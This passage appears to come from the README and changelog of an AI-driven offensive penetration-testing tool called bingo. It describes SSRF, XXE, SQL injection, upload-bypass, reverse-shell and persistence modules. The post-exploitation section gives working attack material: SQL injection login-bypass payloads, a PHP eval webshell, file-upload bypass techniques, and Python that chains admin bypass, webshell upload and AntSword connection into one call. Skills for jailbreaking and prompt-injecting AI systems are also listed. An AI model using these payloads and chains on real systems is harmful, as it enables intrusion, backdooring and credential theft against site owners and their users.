- `bingo/tools/ssrf_scanner.py` — SSRF Auto-Scanner: sensitive URL parameter detection, internal IP/cloud metadata probing (AWS/GCP/Azure 169.254.169.254), protocol wrapper testing (file://, dict://, gopher://), OOB callback support
- `bingo/tools/xxe_scanner.py` — XXE Auto-Scanner: in-band file read payloads, OOB DNS callbacks, SVG/DOCX XXE payload generation, SSRF-via-XXE chaining
- `bingo/tools/upload_bypass.py` — Upload Bypass Engine: extension variation attacks (double ext, null byte, case), MIME type manipulation, magic bytes forgery, polyglot GIF89a webshell, post-upload RCE verification
- `bingo/tools/report_builder.py` — Report Auto-Builder: CVSS v3.1 auto-scoring, cURL PoC generation, severity classification, Markdown/JSON output, multi-vulnerability aggregation
- `bingo/tools/korean_cms.py` — Korean CMS Vulnerability Scanner: GnuBoard5, XpressEngine, Rhymix, Cafe24, Young Cart, WordPress fingerprinting, admin panel detection, CMS-specific SQLi/LFI/IDOR checks
- `bingo/tools/post_exploit.py` — Post-Exploit Engine: automated recon (system info, network, users, env vars, history), SUID/sudo/Docker socket privilege escalation vectors, crontab/SSH key/webshell persistence

**Integration:**
- All 9 modules registered in `bingo/tools/__init__.py` via lazy import (zero import-time cost)
- `system_prompt.py` updated with `=== v2.5.0 EXPANDED AUTO-ENGINE DECISION RULES ===` — AI auto-selects engines based on target context

**i18n:** 20 new string keys (ko/zh/en) for all new engines (`js_analyze_start`, `idor_found`, `auth_bypass_jwt`, `ssrf_found`, `xxe_found`, `upload_bypass_found`, `cms_detected`, `post_exploit_start`, `report_saved`, ...)

**System Prompt:** Full engine orchestration guide — JS Analyzer runs first, feeds endpoints to IDOR/SSRF/SQLi scanners, secrets trigger immediate CRITICAL report, CMS detection auto-selects Korean CMS engine

---

### v2.4.0 — AI Auto-Stage SQLi + DB Privesc + Shell Dropper + WAF++ *(2026-06)*

**New Modules:**
- `bingo/tools/sqli_auto.py` — SQLi Auto-Stage Engine (Error→Union→Boolean→Time→Stacked auto-selection, DB-type specific payloads for MSSQL/MySQL/PostgreSQL/Oracle)
- `bingo/tools/db_privesc.py` — DB Privilege Escalation Automator (xp_cmdshell auto-enable, EXECUTE AS, INTO OUTFILE, COPY TO PROGRAM, UTL_FILE)
- `bingo/tools/shell_dropper.py` — Webshell Dropper + Reverse Shell Generator (certutil, PowerShell DownloadFile, bash/python/nc/powershell payloads)

**WAF Signatures Added:** dotDefender, Imperva, Wallarm, 360wzws, anquanbao, Nginx WAF — each with dedicated bypass priority chains

**i18n:** 14 new string keys (ko/zh/en) for all new engines

**System Prompt:** `=== v2.4.0 AUTO-ENGINE DECISION RULES ===` section added for AI auto-selection guidance

### v2.3.33 — Report Hallucination Fix: Session State Isolation *(2026-06)*

- **🔴 Bug fix: Report hallucination — previous session carry-over eliminated** — When user selected `n` (don't resume), credentials/tables/DB names from the previous session remained in `_agent_state` and were incorrectly included in the new session's final report. Fixed by calling `_reset_agent_state()` immediately when `n` is selected, wiping all previous credentials, table lists, and DB information.
- **🟢 New tracking: `_session_tables` / `_session_credentials`** — Two in-memory lists now track only items discovered in the *current* session (never pre-loaded). `_parse_agent_state` populates both simultaneously.
- **🟢 Report prompt hardening** — `_auto_generate_report` now passes separate "confirmed in this session" vs "from previous session" contexts. AI is explicitly instructed: *"Only report credentials from THIS SESSION. Previous session items must be tagged ⚠️ From previous session (not re-verified)."*
- **🟡 i18n: 3 new multilingual keys** — `session_state_cleared`, `session_prev_data_warning`, `session_current_confirmed` (ko/zh/en).

### v2.3.32 — UTF-16LE False Positive Hash Filter *(2026-06)*

- **🔴 Hash detection: UTF-16LE false positive filter** — `extract_hashes_from_text` now detects UTF-16LE encoded strings (e.g. `25004D0065006D006200650072002500` = `%Member%`) that have the same 32-char hex appearance as NTLM hashes. Every 2-byte pair with `00` as high or low byte is now detected and skipped, preventing wasted crack attempts on non-hash data from MSSQL/ASP Unicode columns.
- **🟡 i18n: 1 new multilingual key** — `hash_utf16le_skipped` (ko/zh/en).

### v2.3.31 — urllib.parse Auto-Import Injection *(2026-06)*

- **🔴 Precheck: `urllib.parse` auto-inject** — `_precheck_python_code` now detects usage of `urllib.parse.quote/urlencode/urlparse` etc. without a corresponding `import urllib.parse`. If missing, it automatically injects `import urllib.parse` before execution. Fixes `NameError: name 'urllib' is not defined` caused by AI confusing `urllib3` (third-party) with `urllib.parse` (stdlib).
- **🔴 Rule 21: urllib.parse vs urllib3** — AI system prompt now explicitly documents that `import urllib3` does NOT make `urllib.parse` available. Always import explicitly: `import urllib.parse` or `from urllib.parse import quote`.
- **🟡 i18n: 1 new multilingual key** — `urllib_parse_injected` (ko/zh/en).

### v2.3.30 — Response Encoding Auto-Detection, Banner Version Fix, Syntax Precheck Fix *(2026-06)*

- **🔴 Rule 21: Response Encoding Auto-Detect** — AI no longer uses `r.text` directly. Smart encoding detection injected automatically: checks `Content-Type` header → HTML meta charset → `apparent_encoding` → UTF-8 fallback. Fixes garbled EUC-KR/EUC-JP/GB2312 output on Korean/Japanese/Chinese legacy ASP sites.
- **🔴 Precheck: `r.text` → `smart_decode()` auto-injection** — `_precheck_python_code` now detects `requests.get/post` + `.text` usage and injects a `_smart_decode()` helper automatically, replacing all `.text` calls before execution.
- **🟠 Banner version fix** — Terminal banner now reads `__version__` dynamically instead of hardcoded `v2.3.4`.
- **🟠 Syntax Precheck false-positive fix** — `None` return value was overloaded (OK + error), causing the warning to fire on every normal execution. Separated into `None` (OK) vs `__SYNTAX_ERR__` (real error).
- **🟡 i18n: 2 new multilingual keys** — `encoding_auto_detected`, `encoding_inject_notice` (ko/zh/en).

### v2.3.29 — WAF ReadTimeout Guard, URL Concat Bug Fix, f-string Auto-Repair *(2026-06)*

Three defensive layers to stop AI-generated code bugs that wasted tokens across every run:

- **🔴 Rule 19: ReadTimeout = WAF silent drop** — When a `requests` call raises `ReadTimeout` specifically on SQL injection payloads (AND/OR/WAITFOR), the AI now correctly identifies this as a WAF dropping the request silently — NOT a time-based SQLi confirmation. Mandatory behavior: try once with encoding, if still timeout → mark as WAF-blocked, pivot immediately. Prevents infinite retry loops.
- **🔴 Rule 20: URL construction guard** — AI is now explicitly prohibited from concatenating `base_url + "https://..."`. The pattern `base_url + "https://www.example.com/path"` creates malformed hosts like `www.example.comhttps`. Mandatory: use full URLs directly or `urljoin()`. The precheck system auto-fixes this pattern at runtime.
- **🔴 Precheck: URL concat auto-fix** — `_precheck_python_code` now detects and auto-corrects `*url* + "https://..."` patterns before execution, replacing them with the full URL only. Prevents `SSLEOFError` and `MaxRetryError` from malformed hosts.
- **🟠 Precheck: f-string auto-repair** — Improved `SyntaxError` handling for Python 3.12 f-string features (same-quote dict subscripts, etc.). Known-safe Python 3.12 patterns now suppress the noisy `⚠ SyntaxError detected` warning instead of showing a false alarm on every loop.
- **🟡 i18n: 2 new multilingual keys** — `waf_timeout_detected`, `url_concat_fixed` (ko/zh/en).

### v2.3.26 — Hard Watchdog Timeout, pymssql VPN Guard, Oracle Validation *(2026-06)*

Critical runtime enforcement and SQL injection accuracy improvements:

- **🔴 Fix: Blocking socket hang (pymssql infinite wait)** — Added a dedicated watchdog thread that fires `p.kill()` after 300 s even when the subprocess produces **zero stdout output** (e.g. pymssql connecting to a VPN NAT IP). The previous timeout only triggered inside the `for raw_line in p.stdout:` loop — which never advances if the process is silent.
- **🔴 Rule 13: pymssql/pyodbc mandatory timeout** — AI must always set `timeout=10, login_timeout=10` on pymssql connections AND run them inside a daemon thread with `join(timeout=15)` to prevent indefinite blocking.
- **🔴 Rule 13: VPN NAT IP guard** — AI must never use `198.18.x.x`, `192.168.x.x`, `172.16-31.x.x`, `10.x.x.x` as a SQL Server target IP. These are VPN internal NAT addresses. Always use the domain name directly.
- **🟠 Rule 14: Boolean oracle validation required** — Before running any char-by-char extraction, the AI must confirm TRUE and FALSE payloads return **different** response sizes (diff ≥ 10 bytes). Identical responses → oracle invalid → switch technique.
- **🟠 Rule 15: WAITFOR strict threshold** — `WAITFOR 5s` is confirmed only when `response_time ≥ 4.0s`. A 1.36 s response for a 5 s WAITFOR is a false positive.
- **🟡 Rule 16: Credential-first attack priority** — If DB credentials were already extracted, the AI must attempt login on all identified login forms **before** continuing complex blind SQLi. Skip pages with no `<input type="password">`.
- **i18n: 6 new multilingual keys** — `script_watchdog_killed`, `pymssql_vpn_ip_warn`, `bool_oracle_invalid`, `waitfor_false_positive`, `cred_first_login_try`, `login_page_no_form` (ko/zh/en).

### v2.3.25 — SQLi Oracle Precision & UnboundLocalError Fix *(2026-06)*

Critical bug fix and SQL injection analysis accuracy improvements:

- **🔴 Fix: `UnboundLocalError: cannot access local variable 't'`** — `for t in threads:` loop variable inside `_run_code_blocks` was shadowing the global `t()` i18n translation function. Renamed to `for _th in threads:` across all 3 occurrences.
- **🟠 Fix: VBScript 800a01a8 false warning suppression** — If real OLE DB SQL errors (`80040e14`, `80040e07`) are also present in the same output batch, the VBScript "NOT injectable" warning is now suppressed. Mixed results correctly identified.
- **🟠 Fix: AI misanalysis of 800a01a8 as WAF bypass** — Added Rule 11 to system_prompt: `800a01a8 = VBScript runtime error ≠ WAF bypass`. AI must not label 800a01a8 responses as successful injections.
- **🟡 Fix: Wasteful ORDER BY/UNION on typed integer parameters** — Added Rule 12: stop all ORDER BY and UNION SELECT enumeration when type errors detected on integer parameters.
- **i18n: 3 new multilingual keys** — `mixed_sqli_result_title`, `mixed_sqli_result_detail`, `typed_param_skip` (ko/zh/en).

### v2.1.4 — `bingo --update` Self-Updater *(2026-06)*

Update bingo to the latest version with a single command — works on **macOS, Windows, and Linux**.

```bash
bingo --update
```

**Auto-detects installation method:**

| Installed via | Update method |
|---------------|--------------|
| `git clone` | `git pull origin main` |
| `pip install bingo-ai` | `pip install --upgrade bingo-ai` (checks PyPI first) |

**Example output (git clone):**
```
📂 Installed via git clone — updating with git pull
⬆  Running git pull...

From https://github.com/bingook/bingo
 * branch    main -> FETCH_HEAD
Already up to date.

✅ Update complete! Restart bingo to apply changes.
```

**Example output (pip, new version available):**
```
📦 Installed via pip — updating from PyPI
📡 Checking for latest version...
🆕 New version available: v2.1.3 → v2.1.4
⬆  Running pip upgrade...

✅ Update complete! Restart bingo to apply changes.
```

- If network is unavailable, the manual command is printed for easy copy-paste.
- Multilingual output: Korean / Chinese / English.

---

### v2.1.3 — Session Resume + /retry + Notifications *(2026-06)*

#### New Feature 1 — Session Auto-Save & Resume

Every loop iteration saves the full session state automatically.  
On next launch, BINGO detects the previous session and asks:

```
╭─ 🔄 Previous session found ──────────────────────╮
│  Target: https://target.co.kr                    │
│  Continue from where you left off?               │
╰──────────────────────────────────────────────────╯
Resume [Y/n]:
```

Restored state includes: conversation history, agent state, auth cookies, loop count, and last execution result.

---

#### New Feature 2 — `/retry` Command

Re-run only the last failed step without restarting from scratch.

```
❯ /retry
🔁 Retrying last failed step...
→ AI analyzes the previous error and writes a corrected approach
```

BINGO sends the last execution result back to AI with the instruction to fix only what failed — no full restart required.

---

#### New Feature 3 — System Notifications

Automatic macOS notification + terminal bell on:

| Event | Notification |
|-------|-------------|
| Task complete (`TASK_COMPLETE`) | 🔔 Normal sound (Glass) |
| Hash found | 🚨 Critical sound (Basso) |
| Credential found | 🚨 Critical sound (Basso) |

Works on macOS via `osascript`. Terminal bell (`\a`) fires on all platforms.

---

### v2.1.2 — Mid-Task Hint Injection + General Conversation Mode *(2026-06)*

#### New Feature 1 — Mid-Task Hint Injection

While the AI execution loop is running, you can now **inject a hint without restarting**.

**Method A — Ctrl+C during loop:**
```
[Loop #7 running...]
→ press Ctrl+C
⚡ Loop paused — type a hint to keep going
   (press Enter or Ctrl+C again → stop completely)
💬 hint ❯ skip captcha, try other parameters
💬 Hint injected — resuming loop (#7)
→ AI applies hint immediately, loop continues
```

**Method B — `/hint` command (anytime):**
```
❯ /hint the login param might be mem_id not user
```

| | Ctrl+C method | /hint command |
|--|--|--|
| **When** | During loop | Anytime |
| **Loop** | Pause → resume | Continues |
| **Stop option** | Enter = full stop | No stop |

Fully multilingual: `ko / zh / en`

---

#### New Feature 2 — General Conversation Mode (Dual-Mode AI)

BINGO now switches automatically between pentest mode and general conversation mode.

- Ask about models, say thank you, ask general questions → natural conversational response
- Give a target URL or pentest task → full pentest mode
- Responses always in the user's configured language (`/lang`)

**Classification logic:**
- URL detected → always pentest mode
- "What is XSS?", "explain SSRF" → general mode (conceptual prefix detected)
- "hack this site", target URLs → pentest mode

---

### v2.1.1 — Hotfix *(2026-06)*

#### Bug Fix — Login False Positive (ASP/IIS Session Cookie Misdetection)

**Problem:** The brute-force login module incorrectly reported successful logins on ASP/IIS targets.

- **Root cause 1 — `auth_tools.py`:** The `_is_login_success()` fallback condition was `status == 200 and len(body) > 500`. On ASP/IIS, every failed login returns HTTP 200 with a ~3,649-byte login page — so *all* attempts were falsely marked as successful.
- **Root cause 2 — `anti_hallucination.py`:** The `add_credential()` method treated any session cookie as evidence of login success. ASP always issues `ASPSESSIONID` regardless of whether authentication succeeded or failed.

**Fix:**
| File | Change |
|---|---|
| `auth_tools.py` | Fallback changed from `status==200 and len(body)>500` → `False`. Added `baseline_len` parameter: probe one known-wrong credential first, then compare response length delta (`>200 bytes`) to detect real success. All three methods (`test_default_creds`, `brute_force`, `password_spray`) now capture a baseline response before testing. |
| `anti_hallucination.py` | Generic session cookies (`ASPSESSIONID`, `PHPSESSID`, `JSESSIONID`) excluded from the "meaningful cookie" check. `VERIFIED` now requires both a success keyword *and* a non-generic cookie or off-page redirect. Fail keywords (`invalid`, `틀렸`, `인증실패`, etc.) immediately force `INFERRED` grade. `CredentialVerifier.verify()` patched with the same logic. |

**Impact:** Zero breaking changes. All existing tests pass. False positives on ASP/IIS brute-force are eliminated.

---

### v2.1.0 — Official Release *(2026-06)*
- **Zero-Hallucination System** — all findings labeled `VERIFIED` / `LIKELY` / `INFERRED` / `AI_ANALYSIS`; nothing discarded
- **Interactive Post-Report Actions** — 3–5 numbered next steps auto-presented after every report; enter a number to continue
- **ACPV — Client-Side Auth Bypass** — AI auto-detects JS-based auth (localStorage/sessionStorage), tests unauthenticated APIs, generates browser console PoC automatically
- **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
- **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
- **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
- **62 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49), WebCacheDeception (#50), CloudTokenRecon (#51), AdvancedSQLiExploit (#52), CopyFailLPE (#53), RubyLibAFLFuzz (#54), AICodeSecSurface (#55), CSPTWafBypass (#56), DOMPurifyPPBypass (#57), CloudflareACMEBypass (#58), React2ShellWafBypass (#59), ApacheDruidSSRF (#60), PanOSAuthBypass (#61), IngressNightmareRCE (#62)
- **Prompt Cache Optimizer** — Three-Breakpoint Architecture (BP1/BP2/BP3) + Relocation Trick + Frozen Datetime; ~70% API cost reduction for 28-step pipelines
- **CloudflareACMEBypass (#58)** — ACME HTTP-01 fail-open WAF bypass detection; origin server fingerprinting, LFI, Spring Actuator, header-based attack vector testing via /.well-known/acme-challenge/* path
- **React2ShellWafBypass (#59)** — CVE-2025-55182 pre-auth RCE attack surface detection + 5 multipart grammar un-equivalence WAF bypass techniques (BP1–BP5, total $170k bounty); safe probe + Burp-ready PoC curl generation
- **28-step exploit pipeline** — added Phase 28 IngressNightmareRCE (CVE-2025-1974) after Phase 27 PanOSAuthBypass
- **62 skill modules** — IngressNightmareRCE (#62): Kubernetes ingress-nginx unauthenticated admission controller + annotation injection + ssl_engine RCE chain (CVE-2025-1974, CVSS 9.8)
- **28 pipeline steps** — Phase 28: IngressNightmareScanner K8s/ingress-nginx detection + admission controller exposure + RCE chain assessment
- Production-stable (`Development Status :: 5 - Production/Stable`)

### v2.0.x — Beta
- Initial public release
- 5-phase red team pipeline
- WAF bypass, hash cracking, tool auto-install
- Multi-model support (DeepSeek / Claude / GPT / GLM / Qwen / Ollama)

---

## Contributing

```bash
git clone https://github.com/bingook/bingo.git
cd bingo
bash install.sh
```

Pull requests are welcome. Please open an issue first for major changes.

---

## Post-Exploitation — SQLi Admin Bypass + Webshell Deploy (v2.2.5)

Real-world post-exploitation pipeline learned from live engagements:
**SQL injection login bypass → file upload → webshell deployment → AntSword connection**.

### SQLi Admin Login Bypass

Comment-based SQL injection bypasses password verification on the server side without knowing the password hash.

```python
from bingo.tools.post_exploit import sqli_login_bypass

result = sqli_login_bypass(
    login_url = "https://target.com/adm/auth/login/check",
    id_field  = "user_id",
    pw_field  = "user_pw",
)
if result["success"]:
    print(f"✅ Login bypassed! Payload: {result['payload']}")
    print(f"   Redirect : {result['redirect_url']}")
    print(f"   Cookie   : {result['cookie']}")
```

**Built-in payloads (auto-iterated):**

| Payload | Technique |
|---------|-----------|
| `admin'-- -` | Comment bypass — most common |
| `admin'#` | MySQL hash-comment bypass |
| `' OR '1'='1'-- -` | Boolean always-true |
| `admin' OR 1=1-- -` | Numeric always-true |
| `admin'/**/OR/**/'1'='1'#` | Space-bypass variant |

**Vulnerable SQL pattern (server-side):**
```sql
SELECT * FROM tbl_admin WHERE user_id='admin'-- -' AND user_pw=MD5(?)
--  ↑ everything after -- is commented out → password check skipped
```

---

### Webshell Upload + AntSword Connection

After gaining admin access, bingo tests file upload endpoints for webshell deployment.

**Supported combinations:**

| Key | Language | Tool | Password |
|-----|----------|------|----------|
| `php_antsword` | PHP | AntSword | `ant` |
| `php_antsword_b64` | PHP | AntSword (base64) | `ant` |
| `php_behinder` | PHP | Behinder v3 | `rebeyond` |
| `php_godzilla` | PHP | Godzilla | `pass` |
| `php_simple` | PHP | curl/browser | `cmd` |
| `jsp_antsword` | JSP | AntSword | `ant` |
| `aspx_antsword` | ASPX | AntSword | `ant` |

```python
from bingo.tools.post_exploit import get_webshell, upload_webshell, verify_webshell

# 1. Select payload
shell = get_webshell("php", "antsword")
# → <?php @eval($_POST["ant"]);?>

# 2. Upload (requires login session opener)
result = upload_webshell(
    opener      = opener,       # from sqli_login_bypass()
    upload_url  = "https://target.com/adm/upload",
    shell_payload = shell,
    bypass_ext  = ".phtml",     # extension bypass
    bypass_ct   = "image/jpeg", # Content-Type spoof
)

# 3. Verify execution
if result["uploaded_url"]:
    v = verify_webshell(opener, result["uploaded_url"], "ant")
    print("✅ Shell alive!" if v["alive"] else "✗ No response")
```

**Upload bypass strategies (auto-iterated in order):**

| Priority | Technique | Example |
|----------|-----------|---------|
| 1 | Extension variant | `.phtml`, `.php5`, `.php3` |
| 2 | Content-Type spoof + magic bytes | `image/jpeg` + `\xff\xd8\xff` prefix |
| 3 | Double extension | `shell.php.jpg` |
| 4 | Null byte | `shell.php%00.jpg` (legacy PHP) |
| 5 | NTFS ADS | `shell.php::$DATA` (Windows IIS) |

---

### AntSword Config Auto-Generation

```python
from bingo.tools.post_exploit import generate_antsword_config, print_antsword_guide
import json

cfg = generate_antsword_config(
    shell_url  = "https://target.com/uploads/shell.php",
    password   = "ant",
    shell_type = "PHP",
)
with open("antsword_config.json", "w") as f:
    json.dump(cfg, f, indent=2)

# Import: AntSword → Data Manager → Import → antsword_config.json
print(print_antsword_guide("https://target.com/uploads/shell.php", "ant"))
```

**Manual AntSword connection:**
1. Open AntSword → right-click empty area → **Add Data**
2. URL: `https://target.com/uploads/shell.php`
3. Password: `ant`
4. Request Type: `POST`
5. Shell Type: `PHP`
6. Click **Test Connection** → green light ✅

---

### Full Pipeline Automation

One-call automation: SQLi bypass → upload → verify → AntSword config:

```python
from bingo.tools.post_exploit import auto_post_exploit
import json

result = auto_post_exploit(
    base_url   = "https://target.com",
    login_url  = "https://target.com/adm/auth/login/check",
    upload_url = "https://target.com/adm/upload",
    id_field   = "user_id",
    pw_field   = "user_pw",
    lang       = "php",
    tool       = "antsword",
)

if result.get("success"):
    print("✅ Webshell confirmed!")
    print(result["antsword_guide"])
    with open("antsword_config.json", "w") as f:
        json.dump(result["antsword"], f, indent=2)
```

**bingo AI auto-selection trigger phrases:**

| Input | Skill Selected |
|-------|---------------|
| `웹쉘 배포`, `webshell`, `shell upload` | `webshell-upload` |
| `로그인 우회`, `admin bypass`, `sqli login` | `sqli-admin-bypass` |
| `antsword`, `AntSword 연결`, `ant 설정` | `antsword-config` |
| `전체 침투`, `full chain`, `post exploit` | `post-exploit-pipeline` |

---

## SecKnowledge Integration — Web+AI Security Knowledge Base (v2.2.6)

> **16 built-in skills** powered by **WooYun 88,636 real-world cases**, **先知 L1-L4 methodology**, **GAARM 150 AI risk identifiers**, and **OWASP LLM/ASI/WSTG**.  
> The AI automatically selects the most relevant skill based on target type and intent — zero manual configuration required.

### Architecture

```
secknowledge_loader.py          ← runtime loader for ~/.cursor/skills/secknowledge/references/
    └── load_reference(key)     ← returns up to 8,000 chars of the reference .md
    └── load_section(key, pat)  ← extract specific section
    └── references_status()     ← check available reference files

skills_data7.py                 ← 16 skills, each with:
    ├── multilingual desc       (ko / en / zh)
    ├── AI auto-select tags
    ├── payloads & commands
    └── load_reference() call   ← live knowledge at prompt time
```

### Skill List (v2.2.6)

| Skill ID | Coverage | Auto-trigger keywords |
|---|---|---|
| `secknow-sqli` | SQL Injection (27,732 WooYun cases) | `sqli`, `sql-injection`, `union`, `blind-sqli` |
| `secknow-xss` | XSS — reflected/stored/DOM (7,532 cases) | `xss`, `cross-site-scripting`, `csp-bypass` |
| `secknow-rce` | RCE / Command Injection (6,826 cases) | `rce`, `command-injection`, `log4shell`, `struts2` |
| `secknow-upload` | File Upload + Webshell | `upload`, `webshell`, `extension-bypass`, `mime-bypass` |
| `secknow-ssrf` | SSRF + Protocol Abuse | `ssrf`, `cloud-metadata`, `gopher`, `redis` |
| `secknow-logic-auth` | Auth Bypass + Business Logic (22,669 cases) | `idor`, `auth-bypass`, `payment`, `password-reset` |
| `secknow-xxe-deser` | XXE + Deserialization | `xxe`, `deserialization`, `ysoserial`, `php-unserialize` |
| `secknow-traversal` | Path Traversal + Info Disclosure | `traversal`, `lfi`, `git-leak`, `backup-leak` |
| `secknow-modern-proto` | GraphQL / HTTP Smuggling / CORS / JWT / OAuth | `graphql`, `http-smuggling`, `cors`, `jwt` |
| `secknow-deployment` | Supply Chain / Cloud / Container / CI-CD | `supply-chain`, `docker`, `kubernetes`, `github-actions` |
| `secknow-prompt-inject` | Prompt Injection (GAARM.0039-0061, OWASP LLM01) | `prompt-injection`, `indirect-injection`, `rag-poisoning` |
| `secknow-mcp-attack` | MCP Protocol Attack (GAARM.0046.x) | `mcp`, `tool-poisoning`, `rug-pull`, `hidden-instruction` |
| `secknow-jailbreak` | LLM Jailbreak (GAARM.0027.x) | `jailbreak`, `dan`, `many-shot`, `adversarial-suffix` |
| `secknow-agent-cot` | Agent / CoT Attack (GAARM.0041-0047) | `agent`, `cot`, `agent-ssrf`, `agent-rce` |
| `secknow-container-esc` | Container / Sandbox Escape | `container-escape`, `privileged`, `cgroup-abuse` |
| `secknow-methodology` | L1-L4 + WooYun + GAARM + OWASP methodology | `methodology`, `pentest`, `recon`, `gaarm` |

### AI Auto-Selection Logic

```
Target is a URL/endpoint  →  secknow-sqli / xss / rce / upload / ssrf / logic-auth
Target has ?id= param     →  secknow-sqli, secknow-logic-auth (IDOR)
Target uses GraphQL       →  secknow-modern-proto
Target is LLM/chatbot     →  secknow-prompt-inject, secknow-jailbreak
Target is MCP server      →  secknow-mcp-attack
Target is AI agent        →  secknow-agent-cot
Inside container          →  secknow-container-esc
Cloud / CI-CD audit       →  secknow-deployment
Need methodology          →  secknow-methodology
```

### Usage Examples

```python
# Direct API
from bingo.tools.secknowledge_loader import load_reference, load_section, references_status

print(references_status())                        # check available refs
sqli_kb  = load_reference("sqli")                # full SQLi reference
xss_waf  = load_section("xss", "WAF", 2000)      # only WAF-bypass section

# bingo CLI — AI auto-selects secknow-* skill automatically
bingo run --target https://target.com/search?q=1
bingo skill secknow-prompt-inject
bingo skill secknow-jailbreak
```

### Reference Files (requires `~/.cursor/skills/secknowledge/references/`)

| Key | File |
|---|---|
| `sqli` | `web-sqli.md` |
| `xss` | `web-xss.md` |
| `rce` | `web-rce.md` |
| `upload` | `web-upload.md` |
| `ssrf` | `web-ssrf-misc.md` |
| `logic-auth` | `web-logic-auth.md` |
| `xxe` | `web-xxe.md` |
| `deser` | `web-deser.md` |
| `traversal` | `web-traversal.md` |
| `prompt` | `ai-app-prompt.md` |
| `mcp` | `ai-app-mcp.md` |
| `jailbreak` | `ai-model-jailbreak.md` |
| `agent-cot` | `ai-app-agent-cot.md` |
| `ai-escape` | `ai-baseline-escape.md` |
| `methodology` | `testing-methodology.md` |
| `gaarm` | `gaarm-risk-matrix.md` |

---

## TruffleHog APK + Malimite iOS Secret Scanner (v2.2.8)

bingo integrates two specialized tools for deep mobile secret scanning:

| Tool | Target | Speed | Key Technique |
|---|---|---|---|
| **TruffleHog** (native APK) | Android `.apk` | **9× faster** than jadx | No decompiler — direct APK parsing |
| **jadx + TruffleHog** | Android `.apk` | Slower but thorough | Full decompile — catches obfuscated code |
| **Malimite** | iOS/macOS `.ipa` | Ghidra-based | Swift class reconstruction + LLM naming |

### How TruffleHog Parses APK Natively (9× Faster)

TruffleHog v3.63+ decodes APK files without calling `jadx` or any external decompiler:

```
┌──────────────────────────────────────────────────────────┐
│  APK file (ZIP structure)                                │
│                                                          │
│  ① AndroidManifest.xml                                   │
│     → Android Binary XML decoded via resources.arsc      │
│     → Resource IDs (e.g. @7F0300b3) resolved to strings  │
│                                                          │
│  ② strings.xml                                           │
│     → Reconstructed from resources.arsc                  │
│     → ID range: 0x7f000000 – 0x7fffffff                  │
│                                                          │
│  ③ classes.dex / classes2.dex / ...                      │
│     → DEX bytecode parsed for const-string instructions  │
│     → Class + method names added as context keywords     │
│     → TruffleHog keyword pre-flighting finds matches     │
│                                                          │
│  ④ All other assets                                      │
│     → *.json, *.properties, *.js, sqlite DBs,            │
│        .git dirs, raw asset files                        │
└──────────────────────────────────────────────────────────┘
```

**Why 9× faster?** Eliminating the full jadx decompilation step saves 2–5 minutes per scan (Facebook Messenger `.apk` with 40 architecture variants dropped from 3 min → 20 sec per file).

### Malimite — Ghidra-based iOS Decompiler

Malimite ([GitHub](https://github.com/LaurieWired/Malimite)) features:
- **Native IPA / .app bundle support** — no manual extraction required
- **Swift class reconstruction** — structs, enums, protocols properly rebuilt
- **Objective-C support** — full method signature recovery
- **Built-in LLM method translation** — resolves obfuscated method names
- **Skips library code** — analyzes only app-owned code, reducing noise

After Malimite decompiles the IPA, bingo automatically:
1. Classifies Swift vs ObjC files
2. Lists security-sensitive methods (password, encrypt, keychain, ssl pinning, etc.)
3. Runs secret pattern scan on all decompiled output

### bingo AI Auto-Selection

| You type | bingo selects |
|---|---|
| `trufflehog target.apk` | `apk-trufflehog-scan` |
| `apk secret scan` | `apk-trufflehog-scan` |
| `hardcoded api key android` | `apk-trufflehog-scan` |
| `jadx full decompile thorough` | `apk-trufflehog-jadx` |
| `malimite target.ipa` | `ios-malimite-decompile` |
| `ios swift decompile` | `ios-malimite-decompile` |
| `ghidra ios reverse` | `ios-malimite-decompile` |
| `apk ipa auto scan` | `mobile-secret-pipeline` |
| `dex const-string resources.arsc` | `apk-dex-secret-analysis` |

### Skills Added (v2.2.8)

| Skill | Description |
|---|---|
| `apk-trufflehog-scan` | TruffleHog native APK scan — 9× faster, no jadx |
| `apk-trufflehog-jadx` | Full jadx decompile + TruffleHog — thorough scan |
| `ios-malimite-decompile` | Malimite Ghidra-based iOS/macOS IPA decompiler |
| `mobile-secret-pipeline` | Unified auto-scan — APK→TruffleHog, IPA→Malimite |
| `apk-dex-secret-analysis` | DEX bytecode analysis + resources.arsc explanation |

### Usage Examples

#### Android APK — TruffleHog Native (Recommended)

```bash
# bingo chat
bingo> target.apk secret scan
bingo> target.apk trufflehog

# CLI direct
trufflehog filesystem target.apk --json --no-verification | jq -r '"[" + .DetectorName + "] " + .Redacted'

# Docker (no install)
docker run -v $(pwd):/work trufflesecurity/trufflehog:latest filesystem /work/target.apk --json

# Python API
python3 -c "
from bingo.tools.apk_secret_scanner import scan_apk_trufflehog
r = scan_apk_trufflehog('target.apk')
print(r.summary())
for s in r.secrets:
    print(f'  [{s.detector}] {s.redacted} @ {s.file}:{s.line}')
"
```

#### Android APK — jadx + TruffleHog (Thorough)

```bash
# When native scan finds nothing suspicious — run full decompile
python3 -c "
from bingo.tools.apk_secret_scanner import scan_apk_jadx_trufflehog
r = scan_apk_jadx_trufflehog('target.apk')
print(r.summary())
"
```

#### iOS IPA — Malimite Decompile + Secret Scan

```bash
# Prerequisite: Java 17+, Malimite.jar at ~/tools/Malimite.jar
java -jar ~/tools/Malimite.jar target.ipa --output ./decompiled_output/

# Then scan
trufflehog filesystem ./decompiled_output/ --json --no-verification

# bingo all-in-one (decompile + secret scan + method listing)
python3 -c "
from bingo.tools.apk_secret_scanner import decompile_ipa_malimite
r = decompile_ipa_malimite('target.ipa')
print(r.summary())
print('\\nSecurity-sensitive methods:')
for m in r.interesting_methods[:10]:
    print(f'  {m}')
"
```

#### Auto-Scan (APK or IPA — auto-detected)

```bash
python3 -c "
from bingo.tools.apk_secret_scanner import auto_scan
r = auto_scan('target.apk')   # or target.ipa
print(r.summary())
"

# Package name → download commands
python3 -c "
import json
from bingo.tools.apk_secret_scanner import auto_scan
print(json.dumps(auto_scan('com.target.app'), indent=2))
"
```

#### Check Tool Availability

```bash
python3 -c "
import json
from bingo.tools.apk_secret_scanner import check_tools
